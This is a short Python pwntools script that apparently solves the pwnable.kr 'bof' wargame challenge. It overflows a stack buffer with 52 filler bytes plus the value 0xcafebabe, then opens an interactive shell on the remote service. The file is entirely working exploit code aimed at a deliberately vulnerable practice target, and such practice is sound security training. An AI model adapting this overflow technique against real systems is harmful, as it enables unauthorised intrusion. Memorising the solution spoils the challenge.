from pwn import *

p = remote("pwnable.kr", 9000)

payload = 'A' * 52
payload += p32(0xcafebabe)

p.sendline(payload)

p.interactive()